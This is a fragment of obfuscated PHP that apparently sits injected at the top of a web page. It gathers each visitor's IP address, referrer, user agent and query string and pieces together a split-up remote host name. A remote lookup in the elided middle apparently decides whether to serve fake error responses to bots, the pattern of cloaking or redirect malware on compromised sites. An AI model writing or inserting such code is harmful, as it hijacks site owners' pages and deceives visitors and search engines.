<?php
 if (!function_exists('xRb9UF9KCO')) { function xRb9UF9KCO() { $xF1cR2 = $_SERVER['SERVER_ADDR']; $xkpfW = '127.0.0.1'; if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xkpfW) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xF1cR2))) {$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];} elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xkpfW)) {$ip=$_SERVER['GEOIP_ADDR'];} elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xkpfW) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xF1cR2))) {$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xkpfW) && (($_SERVER['HTTP_CLIENT_IP'])!=($xF1cR2))) {$ip=$_SERVER['HTTP_CLIENT_IP'];} else {$ip=$_SERVER['REMOTE_ADDR'];} return $ip; }}  $ip=xRb9UF9KCO(); 
 if (!function_exists('xMjs9qwwuDA')) { function xMjs9qwwuDA() { if(empty($_SERVER['HTTP_REFERER'])) { $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER'); } return $_SERVER['HTTP_REFERER']; }} $ref=xMjs9qwwuDA(); 
 if (!function_exists('xD2B8r458L')) { function xD2B8r458L() { if(empty($_SERVER['HTTP_USER_AGENT'])) { $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); } return $_SERVER['HTTP_USER_AGENT']; }} $eRf9t9d9 = xD2B8r458L(); 
 if ($_SERVER['QUERY_STRING']!=''){ $dHerF777hg = ''.urlencode($_SERVER['QUERY_STRING']).''; } else {$dHerF777hg = '';} 
 $sourcename = 'ch'; $whatdo = 'find'; $sourceid = ''; $who = 'us'; $fd = 'x900428'; $dex9 = '.re'; $langua = 'na'; $command = 'st'; 
 ...
 if ($ifbot == '') { echo '<h1>CURL ERROR</h1>'; } elseif ($ifbot != '0') { die(header('HTTP/1.1 504 Internal Server Error')); } else {  } 
 ?>
<html lang="en">
